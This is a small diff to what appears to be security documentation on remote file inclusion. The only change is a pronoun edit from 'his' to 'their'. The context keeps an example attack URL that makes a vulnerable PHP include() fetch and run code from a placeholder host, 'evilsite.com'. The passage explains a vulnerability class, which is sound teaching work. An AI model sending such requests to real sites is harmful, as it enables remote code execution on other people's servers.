@@ -57,7 +57,7 @@ The URL below passes a page name to the include() function.
 The file "evilcode.php" may contain, for example, the phpinfo() function
 which is useful for gaining information about the configuration of the
 environment in which the web service runs. An attacker can ask the
-application to execute his PHP code using the following request:
+application to execute their PHP code using the following request:
 
 <http://testsite.com/?page=http://evilsite.com/evilcode.php>
 
